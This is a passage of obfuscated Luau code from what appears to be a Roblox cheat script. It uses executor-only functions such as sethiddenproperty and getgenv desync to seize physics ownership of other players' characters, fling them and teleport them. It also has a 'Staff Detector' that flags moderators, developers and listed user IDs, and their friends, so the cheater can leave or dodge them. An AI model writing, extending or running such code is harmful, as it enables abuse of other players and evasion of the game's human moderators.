 ) local _IlIlIllIll = _llllIIllIl.Parent:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _IlIlIllIll then pcall( function () _IlIlIllIll.AutoRotate = true end
 ) end
 end
 _llllIIllIl = nil _llIlIIllll = nil end
 local function _IllIIlIlII(_IIIlIIIllI, _IIlIIlIlII) if _IllIlIIllI then _IllIlIIllI:Disconnect() _IllIlIIllI = nil end
 if _llllIIllIl and _llllIIllIl.Parent then _llllIIllIl.AssemblyLinearVelocity = Vector3.zero _llllIIllIl.AssemblyAngularVelocity = Vector3.zero pcall( function () _llllIIllIl.Velocity = Vector3.zero end
 ) pcall( function () _llllIIllIl.RotVelocity = Vector3.zero end
 ) end
 if not _IIIlIIIllI or not _IIlIIlIlII then return end
 _llllIIllIl = _IIIlIIIllI _llIlIIllll = _IIlIIlIlII if _IIIllIllII then _IIIllIllII:Disconnect() _IIIllIllII = nil end
 local _llIIllIIII = _IIIlIIIllI.Parent and _IIIlIIIllI.Parent:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _llIIllIIII then _IIIllIllII = RunService.RenderStepped:Connect( function () if _llIIllIIII and _llIIllIIII.Parent then pcall( function () _llIIllIIII.AutoRotate = false end
 ) end
 end
 ) end
 _IIIlIIIllI.CFrame = _IIlIIlIlII.CFrame * CFrame.new(0x0, 0x0, 0x5) _IIIlIIIllI.AssemblyLinearVelocity = Vector3.zero _IIIlIIIllI.AssemblyAngularVelocity = Vector3.zero if sethiddenproperty then pcall( function () sethiddenproperty(_IIIlIIIllI, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", _IIIlIIIllI) end
 ) pcall( function () sethiddenproperty(_IIIlIIIllI, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", _IIlIIlIlII) end
 ) end
 local _IlIIIIlIIl _IlIIIIlIIl = RunService.Heartbeat:Connect( function () if not _IIIlIIIllI or not _IIIlIIIllI.Parent or not _IIlIIlIlII or not _IIlIIlIlII.Parent then _IlIIIIlIIl:Disconnect() if _IllIlIIllI == _IlIIIIlIIl then _IllIlIIllI = nil end
 if sethiddenproperty then if _IIIlIIIllI and _IIIlIIIllI.Parent then pcall( function () sethiddenproperty(_IIIlIIIllI, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", nil) end
 ) end
 if _IIlIIlIlII and _IIlIIlIlII.Parent then pcall( function () sethiddenproperty(_IIlIIlIlII, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", nil) end
 ) end
 end
 if _IIIlIIIllI and _IIIlIIIllI.Parent then _IIIlIIIllI.AssemblyLinearVelocity = Vector3.zero _IIIlIIIllI.AssemblyAngularVelocity = Vector3.zero pcall( function () _IIIlIIIllI.Velocity = Vector3.zero end
 ) pcall( function () _IIIlIIIllI.RotVelocity = Vector3.zero end
 ) end
 return end
 _IIIlIIIllI.CFrame = _IIlIIlIlII.CFrame * CFrame.new(0x0, 0x0, 0x5) _IIIlIIIllI.AssemblyLinearVelocity = Vector3.zero _IIIlIIIllI.AssemblyAngularVelocity = Vector3.zero if sethiddenproperty then pcall( function () sethiddenproperty(_IIIlIIIllI, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", _IIlIIlIlII) end
 ) end
 end
 ) _IllIlIIllI = _IlIIIIlIIl end
 local function _llIllllIIl() _IIIlIIlIlI() end
 for _lllIlllIIl, _IIIIIlIlll in pairs(Players:GetPlayers()) do if _IIIIIlIlll == _llIIIlIIll then continue end
 local _lIlIIIIlII = _llIlIlIlIl(_IIIIIlIlll) local _IIlIllIIlI = _lIlIIIIlII and _lIlIIIIlII:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _IIlIllIIlI then local _IIlIIIlIIl = _IIlIllIIlI.Died:Connect( function () local _lllIIIIIlI = _llIlIlIlIl(_IIIIIlIlll) if _lllIIIIIlI then _lllIIIIIlI:SetAttribute("\067\114\117\115\104\101\100\082\111\099\107\086\097\114\105\097\110\116", nil) end
 end
 ) table.insert(_IlllIIlllI, _IIlIIIlIIl) end
 local _llllIIlIII = _IIIIIlIlll.CharacterAdded:Connect( function (_lllIIIIIlI) task.wait(0.1) if _lllIIIIIlI then _lllIIIIIlI:SetAttribute("\067\114\117\115\104\101\100\082\111\099\107\086\097\114\105\097\110\116", nil) end
 end
 ) table.insert(_IlllIIlllI, _llllIIlIII) end
 task.spawn( function () local _IIlIIllllI = workspace.Live:FindFirstChild("\087\101\097\107\101\115\116\032\068\117\109\109\121") if _IIlIIllllI then local _IIlllIllll = _IIlIIllllI.AncestryChanged:Connect( function () if not _IIlIIllllI:IsDescendantOf(workspace) then pcall( function () _IIlIIllllI:SetAttribute("\067\114\117\115\104\101\100\082\111\099\107\086\097\114\105\097\110\116", nil) end
 ) end
 end
 ) table.insert(_IlllIIlllI, _IIlllIllll) end
 end
 ) local function _IllIllIIII() local _IlIlIlIIIl = {} local _IllIIIlIlI = {} for _lllIlllIIl, _IIIIIlIlll in pairs(_llIIIlllII()) do if table.find(RevenantWhitelist, _IIIIIlIlll) then continue end
 local _lIlIIIIlII = _llIlIlIlIl(_IIIIIlIlll) local _IIIIIlIIIl = _lIlIIIIlII and (_lIlIIIIlII:FindFirstChild("\070\111\114\099\101\070\105\101\108\100") or _lIlIIIIlII:FindFirstChild("\065\098\115\111\108\117\116\101\073\109\109\111\114\116\097\108") or _lIlIIIIlII:FindFirstChild("\066\101\105\110\103\071\114\097\098\098\101\100") or _lIlIIIIlII:FindFirstChild("\072\117\110\116\101\114\067\111\117\110\116\101\114") or _lIlIIIIlII:FindFirstChild("\065\116\111\109\105\099\067\111\117\110\116\101\114")) if _lIlIIIIlII and not _IIIIIlIIIl and not _lIlIIIIlII:GetAttribute("\067\114\117\115\104\101\100\082\111\099\107\086\097\114\105\097\110\116") then if not (_lIlIIIIlII:GetAttribute("\085\108\116\101\100") and _lIlIIIIlII:GetAttribute("\067\104\097\114\097\099\116\101\114") == "\066\097\116\116\101\114") then if _IlIIlIlIll(_IIIIIlIlll) then table.insert(_IlIlIlIIIl, _IIIIIlIlll) else table.insert(_IllIIIlIlI, _IIIIIlIlll) end
 end
 end
 end
 if #_IlIlIlIIIl > 0x0 then return _IlIlIlIIIl[math.random(0x1, #_IlIlIlIIIl)] end
 if #_IllIIIlIlI > 0x0 then return _IllIIIlIlI[math.random(0x1, #_IllIIIlIlI)] end
 local _IllllIlllI = workspace.Live:FindFirstChild("\087\101\097\107\101\115\116\032\068\117\109\109\121") local _IlIlIlIIll = _IllllIlllI and (_IllllIlllI:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") or _IllllIlllI.PrimaryPart) local _lIlIIllIII = _IllllIlllI and _IllllIlllI:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _IlIlIlIIll and _lIlIIllIII and _lIlIIllIII.Health > 0x0 and not _IllllIlllI:GetAttribute("\067\114\117\115\104\101\100\082\111\099\107\086\097\114\105\097\110\116") and not _IllllIlllI:GetAttribute("\070\114\101\101\122\101") and not _IllllIlllI:FindFirstChild("\066\101\105\110\103\071\114\097\098\098\101\100") and not _IllllIlllI:FindFirstChild("\072\117\110\116\101\114\067\111\117\110\116\101\114") and not _IllllIlllI:FindFirstChild("\065\116\111\109\105\099\067\111\117\110\116\101\114") then return _IllllIlllI end
 return nil end
 local _IIlIlIIllI = _IllIllIIII() local _lllIlIIIlI = _IIlIlIIllI == workspace.Live:FindFirstChild("\087\101\097\107\101\115\116\032\068\117\109\109\121") local _llIIlIlIlI = _lllIlIIIlI and _IIlIlIIllI or (_IIlIlIIllI and _llIlIlIlIl(_IIlIlIIllI)) do local _lIIllIIllI = _llIlIlIlIl(_llIIIlIIll) local _IIIlIIIllI = _lIIllIIllI and _llIlIlllII(_lIIllIIllI) local _llllIIllIl = _llIIlIlIlI and (_llIIlIlIlI:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") or _llIlIlllII(_llIIlIlIlI)) if _IIIlIIIllI and _llllIIllIl then _IllIIlIlII(_IIIlIIIllI, _llllIIllIl) end
 if _lllIlIIIlI and _llIIlIlIlI then _llIIlIlIlI:SetAttribute("\067\114\117\115\104\101\100\082\111\099\107\086\097\114\105\097\110\116", true) end
 end
 local function _lIIlIlllIl(_IIlIIllllI, hitConfirmed) _IIIlIIlIlI() if hitConfirmed and _llIIlIlIlI then _llIIlIlIlI:SetAttribute("\067\114\117\115\104\101\100\082\111\099\107\086\097\114\105\097\110\116", true) end
 _lIlIllllll = false local _IIllIIlIII = _IIlIIllllI == workspace.Live:FindFirstChild("\087\101\097\107\101\115\116\032\068\117\109\109\121") _IIlIlIIllI = _IIllIIlIII and nil or _IIlIIllllI _llIIlIlIlI = _IIllIIlIII and _IIlIIllllI or (_IIlIIllllI and _llIlIlIlIl(_IIlIIllllI)) if _IIllIIlIII and _llIIlIlIlI then _llIIlIlIlI:SetAttribute("\067\114\117\115\104\101\100\082\111\099\107\086\097\114\105\097\110\116", true) end
 local _lIIllIIllI = _llIlIlIlIl(_llIIIlIIll) local _IIIlIIIllI = _lIIllIIllI and _llIlIlllII(_lIIllIIllI) local _IIIIllIIIl = _llIIlIlIlI and (_llIIlIlIlI:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") or _llIlIlllII(_llIIlIlIlI)) if _IIIlIIIllI and _IIIIllIIIl then _IllIIlIlII(_IIIlIIIllI, _IIIIllIIIl) end
 end
 local _lIIIlIIllI = false local _IllIIIllII _IllIIIllII = RunService.Heartbeat:Connect( function () if _lIIIlIIllI then _IllIIIllII:Disconnect() _llIllllIIl() for _lllIlllIIl, _IIIlIlllll in pairs(_IlllIIlllI) do pcall( function () _IIIlIlllll:Disconnect() end
 ) end
 _IlllIIlllI = {} return end
 if not animTrack.IsPlaying then _IllIIIllII:Disconnect() _llIllllIIl() for _lllIlllIIl, _IIIlIlllll in pairs(_IlllIIlllI) do pcall( function () _IIIlIlllll:Disconnect() end
 ) end
 _IlllIIlllI = {} if _lIlIllllll and _llIIlIlIlI and _llIIlIlIlI ~= workspace.Live:FindFirstChild("\087\101\097\107\101\115\116\032\068\117\109\109\121") then _llIIlIlIlI:SetAttribute("\067\114\117\115\104\101\100\082\111\099\107\086\097\114\105\097\110\116", true) end
 return end
 if animTrack.TimePosition >= 0x1 then for _lllIlllIIl, _IIIIIlIlll in pairs(Players:GetPlayers()) do if _IIIIIlIlll ~= _llIIIlIIll then local _lIlIIIIlII = _llIlIlIlIl(_IIIIIlIlll) if _lIlIIIIlII then _lIlIIIIlII:SetAttribute("\067\114\117\115\104\101\100\082\111\099\107\086\097\114\105\097\110\116", nil) end
 end
 end
 end
 local _lIIllIIllI = _llIlIlIlIl(_llIIIlIIll) local _IIIlIIIllI = _lIIllIIllI and _llIlIlllII(_lIIllIIllI) local _lIlllIllll = _lIIllIIllI and _lIllIlIIlI(_lIIllIIllI) for _lllIlllIIl, _IIIIIlIlll in pairs(Players:GetPlayers()) do if _IIIIIlIlll == _llIIIlIIll then continue end
 local _lIlIIIIlII = _llIlIlIlIl(_IIIIIlIlll) local _IIlIllIIlI = _lIlIIIIlII and _lIlIIIIlII:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") local _llllIIlllI = _lIlIIIIlII and _lIlIIIIlII:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if not _IIlIllIIlI or not _llllIIlllI then continue end
 if _lIlIIIIlII:GetAttribute("\067\114\117\115\104\101\100\082\111\099\107\086\097\114\105\097\110\116") then continue end
 if _lIlIIIIlII:FindFirstChild("\065\098\115\111\108\117\116\101\073\109\109\111\114\116\097\108") or _lIlIIIIlII:FindFirstChild("\072\117\110\116\101\114\067\111\117\110\116\101\114") or _lIlIIIIlII:FindFirstChild("\065\116\111\109\105\099\067\111\117\110\116\101\114") then continue end
 if _IIIIIlIlII(_IIlIllIIlI, "\049\050\057\057\052\053\057\048\055\048\052\052\049\050\053") and _lIlllIllll and _IIIIIlIlII(_lIlllIllll, "\049\051\049\050\050\054\052\051\048\052\054\057\057\051\049") then if _IIlIlIIllI == _IIIIIlIlll then _lIlIllllll = true local next = _IllIllIIII() if next and next ~= _IIlIlIIllI then _lIIlIlllIl(next, true) elseif not next then _IIIlIIlIlI() if _llIIlIlIlI then _llIIlIlIlI:SetAttribute("\067\114\117\115\104\101\100\082\111\099\107\086\097\114\105\097\110\116", true) end
 _lIIIlIIllI = true end
 end
 end
 end
 for _lllIlllIIl, _IIIIIlIlll in pairs(Players:GetPlayers()) do if _IIIIIlIlll == _llIIIlIIll then continue end
 local _lIlIIIIlII = _llIlIlIlIl(_IIIIIlIlll) local _IIlIllIIlI = _lIlIIIIlII and _lIlIIIIlII:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") local _llllIIlllI = _lIlIIIIlII and _lIlIIIIlII:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if not _IIlIllIIlI or not _llllIIlllI then continue end
 if _lIlIIIIlII:GetAttribute("\067\114\117\115\104\101\100\082\111\099\107\086\097\114\105\097\110\116") then continue end
 if _lIlIIIIlII:FindFirstChild("\065\098\115\111\108\117\116\101\073\109\109\111\114\116\097\108") or _lIlIIIIlII:FindFirstChild("\072\117\110\116\101\114\067\111\117\110\116\101\114") or _lIlIIIIlII:FindFirstChild("\065\116\111\109\105\099\067\111\117\110\116\101\114") then continue end
 if _IIIIIlIlII(_IIlIllIIlI, "\056\048\057\049\048\048\054\053\052\052\055\050\048\054") then if _IIIlIIIllI and _llllIIlllI then local _IlIIllIIlI = workspace.Live:FindFirstChild("\087\101\097\107\101\115\116\032\068\117\109\109\121") if _llIIlIlIlI and _llIIlIlIlI == _IlIIllIIlI then _llIIlIlIlI:SetAttribute("\067\114\117\115\104\101\100\082\111\099\107\086\097\114\105\097\110\116", true) end
 _IllIIlIlII(_IIIlIIIllI, _llllIIlllI) _lIlIIIIlII:SetAttribute("\067\114\117\115\104\101\100\082\111\099\107\086\097\114\105\097\110\116", true) _IIlIlIIllI = _IIIIIlIlll _llIIlIlIlI = _lIlIIIIlII _lIlIllllll = true end
 end
 end
 do local _IIlIIllllI = workspace.Live:FindFirstChild("\087\101\097\107\101\115\116\032\068\117\109\109\121") local _IlIIIIlIII = _IIlIIllllI and _IIlIIllllI:FindFirstChild("\072\117\109\097\110\111\105\100") local _IIIIIIIIlI = _IlIIIIlIII and _IlIIIIlIII:FindFirstChild("\065\110\105\109\097\116\111\114") local function _lIlllIllIl(_IIIIllIIlI) if not _IIIIIIIIlI then return false end
 for _lllIlllIIl, _IIlIIllIIl in pairs(_IIIIIIIIlI:GetPlayingAnimationTracks()) do if _IIlIIllIIl.Animation.AnimationId:match(_IIIIllIIlI) then return true end
 end
 return false end
 if _IIlIIllllI and _IlIIIIlIII and not _IIlIIllllI:GetAttribute("\067\114\117\115\104\101\100\082\111\099\107\086\097\114\105\097\110\116") then if _lIlllIllIl("\049\050\057\057\052\053\057\048\055\048\052\052\049\050\053") or _lIlllIllIl("\056\048\057\049\048\048\054\053\052\052\055\050\048\054") then _IIlIIllllI:SetAttribute("\067\114\117\115\104\101\100\082\111\099\107\086\097\114\105\097\110\116", true) if _lIlllIllIl("\056\048\057\049\048\048\054\053\052\052\055\050\048\054") then local _IlllllllII = _llIlIlIlIl(_llIIIlIIll) local _lIIllllIIl = _IlllllllII and _lIllIlIIlI(_IlllllllII) if _lIIllllIIl and _IIIIIlIlII(_lIIllllIIl, "\049\051\049\050\050\054\052\051\048\052\054\057\057\051\049") then task.spawn( function () task.wait(1.2) local _IIIlllIIlI = _llIlIlIlIl(_llIIIlIIll) local _IlIIlIIlIl = _IIIlllIIlI and _llIlIlllII(_IIIlllIIlI) if not _IlIIlIIlIl then return end
 if (tonumber(_llIIIlIIll:GetAttribute("\085\108\116\105\109\097\116\101")) or 0x0) >= 0x64 then return end
 getgenv().desync = { CFrame = CFrame.new(0x0, -0x7148, 0x0) } task.wait(0.65) getgenv().desync = nil end
 ) end
 end
 if _llIIlIlIlI == _IIlIIllllI then _IIIlIIlIlI() local next = _IllIllIIII() if next and next ~= _IIlIIllllI then _lIIlIlllIl(next, false) else _lIIIlIIllI = true end
 end
 end
 end
 end
 if _llIIlIlIlI and not _llIIlIlIlI.Parent then pcall( function () _llIIlIlIlI:SetAttribute("\067\114\117\115\104\101\100\082\111\099\107\086\097\114\105\097\110\116", nil) end
 ) local next = _IllIllIIII() if next then _lIIlIlllIl(next, false) else _lIIIlIIllI = true end
 end
 local _IlIIlIllIl = _llIIlIlIlI and (_llIIlIlIlI:FindFirstChild("\070\111\114\099\101\070\105\101\108\100") or _llIIlIlIlI:FindFirstChild("\065\098\115\111\108\117\116\101\073\109\109\111\114\116\097\108") or _llIIlIlIlI:FindFirstChild("\066\101\105\110\103\071\114\097\098\098\101\100") or _llIIlIlIlI:FindFirstChild("\072\117\110\116\101\114\067\111\117\110\116\101\114") or _llIIlIlIlI:FindFirstChild("\065\116\111\109\105\099\067\111\117\110\116\101\114")) if _IlIIlIllIl then local next = _IllIllIIII() if next and next ~= _IIlIlIIllI then _lIIlIlllIl(next, false) elseif not next then _lIIIlIIllI = true end
 end
 end
 ) end
 end
 ) _llIIllllIl[#_llIIllllIl+0x1] = _lllIlIIlll.AnimationPlayed:Connect( function (animTrack) if not _IIlIlIIlIl.SkillThrow or not _IIlIlIIlIl.SkillThrow.Value then return end
 local _IIIIIlllIl = animTrack.Animation.AnimationId local _lIlIllllII = _IlIllIIllI.SkillThrowMoves and _IlIllIIllI.SkillThrowMoves.Value if not _lIlIllllII then return end
 local _lIIllIIllI = _llIlIlIlIl(_llIIIlIIll) local _IIIlIIIllI = _lIIllIIllI and _llIlIlllII(_lIIllIIllI) if not _IIIlIIIllI then return end
 if _IIIIIlllIl:match("\049\050\051\048\057\056\051\053\049\048\053") and rawget(_lIlIllllII, "\072\117\110\116\101\114\115\032\071\114\097\115\112") then task.spawn( function () task.wait(0.3) local _IllllIlIII = _IIIlIIIllI.CFrame game:GetService("\084\119\101\101\110\083\101\114\118\105\099\101"):Create(_IIIlIIIllI, TweenInfo.new(0.4, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut), { CFrame = _IIIlIIIllI.CFrame * CFrame.new(0x0, 0x9C4, 0x0), }):Play() task.wait(0.8) _lIllllIlIl(_IllllIlIII) end
 ) elseif _IIIIIlllIl:match("\049\052\048\048\052\050\051\053\055\055\055") and rawget(_lIlIllllII, "\072\111\109\101\114\117\110") then task.spawn( function () task.wait(0.4) local _IllllIlIII = _IIIlIIIllI.CFrame game:GetService("\084\119\101\101\110\083\101\114\118\105\099\101"):Create(_IIIlIIIllI, TweenInfo.new(0.4, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut), { CFrame = _IIIlIIIllI.CFrame * CFrame.new(0x0, 0x2710, 0x0), }):Play() task.wait(0x1) _lIllllIlIl(_IllllIlIII) end
 ) end
 end
 ) local function _IIIIllIlIl(enemyPlayer) local function _IIlllIlIll(_lllllIlIII) local _llIIllIIIl = _lllllIlIII and _lIllIlIIlI(_lllllIlIII) if not _llIIllIIIl then return end
 _llIIllllIl[#_llIIllllIl+0x1] = _llIIllIIIl.AnimationPlayed:Connect( function (_llIIllIlIl) local _IlllIlIIlI = _llIIllIlIl.Animation.AnimationId local _lIIllIIllI = _llIlIlIlIl(_llIIIlIIll) local _lIlllIllll = _lIIllIIllI and _lIllIlIIlI(_lIIllIIllI) if _IlllIlIIlI:match("\049\050\057\057\052\053\057\048\055\048\052\052\049\050\053") then if _lIlllIllll and _IIIIIlIlII(_lIlllIllll, "\049\051\053\049\048\052\050\049\048\052\048\048\054\049\048") then if _lllllIlIII then _lllllIlIII:SetAttribute("\067\114\117\115\104\101\100\082\111\099\107\086\097\114\105\097\110\116", true) end
 end
 elseif _IlllIlIIlI:match("\056\048\057\049\048\048\054\053\052\052\055\050\048\054") then if _lIlllIllll and _IIIIIlIlII(_lIlllIllll, "\049\051\053\049\048\052\050\049\048\052\048\048\054\049\048") then if _lllllIlIII then _lllllIlIII:SetAttribute("\067\114\117\115\104\101\100\082\111\099\107\086\097\114\105\097\110\116", true) end
 end
 end
 end
 ) end
 local _lllllIlIII = _llIlIlIlIl(enemyPlayer) if _lllllIlIII then _IIlllIlIll(_lllllIlIII) end
 _lIlIIIIIll[#_lIlIIIIIll+0x1] = enemyPlayer.CharacterAdded:Connect( function (newChar) task.wait(0.5) _IIlllIlIll(newChar) end
 ) end
 for _lllIlllIIl, _IIIIIlIlll in pairs(Players:GetPlayers()) do if _IIIIIlIlll ~= _llIIIlIIll then _IIIIllIlIl(_IIIIIlIlll) end
 end
 _lIlIIIIIll[#_lIlIIIIIll+0x1] = Players.PlayerAdded:Connect( function (_IIIIIlIlll) task.wait(0x1) _IIIIllIlIl(_IIIIIlIlll) end
 ) end
 end
 task.spawn(_IIllllIIII) _lIlIIIIIll[#_lIlIIIIIll+0x1] = _llIIIlIIll.CharacterAdded:Connect( function () task.spawn(_IIllllIIII, true) end
 ) table.insert(_llIlllIlIl, function () for _lllIlllIIl, _IllIIIllII in pairs(_llIIllllIl) do _IllIIIllII:Disconnect() end
 table.clear(_llIIllllIl) for _lllIlllIIl, _IllIIIllII in pairs(_lIlIIIIIll) do _IllIIIllII:Disconnect() end
 table.clear(_lIlIIIIIll) if _IIllIIIlII then _IIllIIIlII:Destroy() _IIllIIIlII = nil end
 pcall( function () _IIlIlIIlIl["\065\117\116\111\095\076\111\099\107\045\111\110\095\080\114\101\100\105\099\116\105\111\110"]:SetValue(false) end
 ) pcall( function () _IIlIlIIlIl.TouchFlingEnabled:SetValue(false) end
 ) pcall( function () _IIlIlIIlIl.TogWeld:SetValue(false) end
 ) pcall( function () _IIlIlIIlIl.CustomFrontDash:SetValue(false) end
 ) pcall( function () _IIlIlIIlIl.CustomSideDash:SetValue(false) end
 ) pcall( function () _IIlIlIIlIl.CustomBackDash:SetValue(false) end
 ) _IlIIlIllIl["\084\111\117\099\104\032\070\108\105\110\103"] = false local _lIIllIIllI = _llIIIlIIll.Character local _lIlllIllll = _lIIllIIllI and _lIIllIIllI:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _lIlllIllll then pcall( function () _lIlllIllll.AutoRotate = true end
 ) end
 end
 ) end
 end
 if _IlllIlIllI then task.spawn( function () pcall( function () _G.FreeEmotes = true _llIIIlIIll:SetAttribute("\069\109\111\116\101\083\101\097\114\099\104\066\097\114", true) _llIIIlIIll:SetAttribute("\069\120\116\114\097\083\108\111\116\115", true) _llIIIlIIll:SetAttribute("\069\109\111\116\101\080\097\103\101\115", true) end
 ) end
 ) end
 if _IlllIlIllI and _lIlIlIllIl.Misc then local ReplicatedStorage = game:GetService("\082\101\112\108\105\099\097\116\101\100\083\116\111\114\097\103\101") local TeleportService = game:GetService("\084\101\108\101\112\111\114\116\083\101\114\118\105\099\101") local function _lIIIlIlIII() pcall( function () game:GetService("\080\108\097\121\101\114\115").LocalPlayer:Kick("\092\110\091\090\075\065\089\084\083\066\093\092\110\065\110\116\105\099\104\101\097\116\032\084\114\105\103\103\101\114\101\100\044\032\089\111\117\032\119\101\114\101\032\114\101\112\111\114\116\101\100\032\102\111\114\032\101\120\112\108\111\105\116\105\110\103\046") end
 ) end
 end
 local _IlIIlllllI = "\085\110\107\110\111\119\110" pcall( function () local _lIlIlllIIl = game:GetService("\082\101\112\108\105\099\097\116\101\100\083\116\111\114\097\103\101"):WaitForChild("\071\101\116\083\101\114\118\101\114\084\121\112\101", 0x1) if _lIlIlllIIl then _IlIIlllllI = _lIlIlllIIl:InvokeServer() end
 end
 ) local function _lIlllIIllI(_IIIIIlIlll) if typeof(_IIIIIlIlll) ~= "\116\097\098\108\101" or not _IIIIIlIlll then _IIIIIlIlll = nil end
 local _llIlllIlll = game:GetService("\080\108\097\121\101\114\115") local _IIIlIlIIlI = game:GetService("\084\101\108\101\112\111\114\116\083\101\114\118\105\099\101") local _lllIIlllll = _llIlllIlll.LocalPlayer local _IIIIllIIlI = game.PrivateServerId ~= '' or #_llIlllIlll:GetPlayers() <= 0x1 if _IIIIllIIlI then pcall( function () _lllIIlllll:Kick(_IIIIIlIlll and (_IIIIIlIlll.Message or "\082\101\106\111\105\110\105\110\103\046\046\046\046") or "\082\101\106\111\105\110\105\110\103\046\046\046\046") end
 ) task.wait() pcall( function () _IIIlIlIIlI:Teleport(game.PlaceId, _lllIIlllll) end
 ) else pcall( function () _lllIIlllll:Kick(_IIIIIlIlll and (_IIIIIlIlll.Message or "\082\101\106\111\105\110\105\110\103\046\046\046\046") or "\082\101\106\111\105\110\105\110\103\046\046\046\046") end
 ) task.delay(_IIIIIlIlll and _IIIIIlIlll.Delay or 0.1, function () pcall( function () _IIIlIlIIlI:TeleportToPlaceInstance(game.PlaceId, game.JobId, _lllIIlllll) end
 ) end
 ) end
 end
 local _lllIlIIlIl, TabMiscScripts, TabMiscExtra, TabMiscLeaderboard if _IlllIlIllI and _lIlIlIllIl.Misc then _lllIlIIlIl = _lIlIlIllIl.Misc:AddLeftGroupbox("\083\116\097\102\102\032\068\101\116\101\099\116\111\114", "\103\097\118\101\108") TabMiscScripts = _lIlIlIllIl.Misc:AddLeftGroupbox("\083\099\114\105\112\116\115", "\102\111\108\100\101\114") TabMiscExtra = _lIlIlIllIl.Misc:AddRightGroupbox("\069\120\116\114\097", "\112\108\117\115") TabMiscLeaderboard = _lIlIlIllIl.Misc:AddRightGroupbox("\076\101\097\100\101\114\098\111\097\114\100", "\109\111\110\105\116\111\114") end
 if _IlllIlIllI and _lIlIlIllIl.Misc then local _lIIllIIIII = _lllIlIIlIl local _IllIIIIIll = { 0x1932BAD7, 0xBCF405C, 0x289D6CE4, 0xCB841A55, 0x143E65A3, 0x19B00819, 0x798D9C24, 0x704511B, 0x3C88C39C, 0xFBB786A, 0x6BACBF3, 0x8831CA42, 0x4B7C4F49, 0xBA014FC6, 0x446F3955, 0x61592AF6, 0xC7AD29C6, 0x39E33D32, 0x276A3BD8, 0x3F0B0B9, 0x49C26B1, 0x9F973F4, 0x7A817ED3, 0x87681E0, 0x1A295AD5, 0x52EB0917, 0x6B152DB5, 0xF3D3DB2, 0xBC7A2E32, 0x3F2750C3, 0x4B1887AB, 0x1DA178B, 0x3E19A2F4, 0x3B4E67FD, 0x563ACD39, 0x49EF265, 0x3BADC058, 0x9707BD75, 0x1290386E7, } local function _IllIlIllII(_lllIIlllll) if _lllIIlllll == _llIIIlIIll then return end
 local _IllllIllII = _lllIIlllll.DisplayName local _lIIIllIIII = _IllllIllII .. "\040\064" .. _lllIIlllll.Name .. "\041" local _IlIIIlIIIl = _IlIllIIllI.LeaveOnDropdown and _IlIllIIllI.LeaveOnDropdown.Value or {} local function _lllIlIIllI(typeStr, customMsg) if _IlIIIlIIIl[typeStr] then _llIIIlIIll:Kick("\092\110\091\090\075\065\089\084\083\066\093\092\110" .. _lIIIllIIII .. "\032\106\111\105\110\101\100\046\092\110\084\104\101\121\039\114\101\032\102\108\097\103\103\101\100\032\097\115\058\032" .. typeStr .. "\046") else _IllIIlIIll:Notify({ Title = _lIllIllIII("\072\101\097\100\115\032\117\112"), Content = customMsg, _IllIIlIlll = 0xA }) end
 end
 local _lIIlIIIlII, inGroup = pcall( function () return _lllIIlllll:IsInGroup(0xB74DCF) end
 ) if _lIIlIIIlII and inGroup then local _IIIlllIIII, role = pcall( function () return _lllIIlllll:GetRoleInGroup(0xB74DCF) end
 ) local _lllllIIlll = false local _IIllIIIlll = (_IIIlllIIII and role) and role or "\063" if _IIIlllIIII and role then local _IlIIIIIIll = role:lower() _lllllIIlll = _IlIIIIIIll:find("\109\111\100\101\114\097\116\111\114") or _IlIIIIIIll:find("\100\101\118\101\108\111\112\101\114") or _IlIIIIIIll:find("\099\111\110\116\114\105\098\117\116\111\114") or _IlIIIIIIll:find("\116\101\115\116\101\114") or _IlIIIIIIll:find("\111\119\110\101\114") or _IlIIIIIIll:find("\097\110\111\109\097\108\121\032\112\108\097\121\101\114") end
 if _lllllIIlll then _lllIlIIllI("\083\116\097\102\102", _lIIIllIIII .. "\032\105\115\032\097\032\115\116\097\102\102\032\040" .. _IIllIIIlll .. "\041\046\032\104\101\097\100\115\032\117\112\046") return end
 end
 for _lllIlllIIl, _IIIIllIIlI in ipairs(_IllIIIIIll) do if _lllIIlllll.UserId == _IIIIllIIlI then _lllIlIIllI("\083\112\101\099\105\097\108\032\080\101\111\112\108\101", _lIIIllIIII .. "\032\105\115\032\097\032\112\111\115\115\105\098\108\101\032\109\111\100\046") return end
 end
 local _IIIIlIIIII = {} for _lllIlllIIl, _IIIIllIIlI in ipairs(_IllIIIIIll) do local _IIIlllIIII, isFriend = pcall( function () return _lllIIlllll:IsFriendsWith(_IIIIllIIlI) end
 ) if _IIIlllIIII and isFriend then local _llllIllIII, _llIlIIIIll = pcall( function () return Players:GetNameFromUserIdAsync(_IIIIllIIlI) end
 ) if _llllIllIII then local _IllllIllII = _llIlIIIIll pcall( function () local _IIlIllIIII = game:GetService("\085\115\101\114\083\101\114\118\105\099\101"):GetUserInfosByUserIdsAsync({_IIIIllIIlI}) if _IIlIllIIII and _IIlIllIIII[0x1] then _IllllIllII = _IIlIllIIII[0x1].DisplayName end
 end
 ) _IIIIlIIIII[#_IIIIlIIIII+0x1] = _IllllIllII .. "\040\064" .. _llIlIIIIll .. "\041" end
 end
 end
 if #_IIIIlIIIII > 0x0 then _lllIlIIllI("\070\114\105\101\110\100\115\032\119\105\116\104\032\083\116\097\102\102", _lIIIllIIII .. "\032\105\115\032\102\114\105\101\110\100\115\032\119\105\116\104\032" .. table.concat(_IIIIlIIIII, "\044\032") .. "\046") end
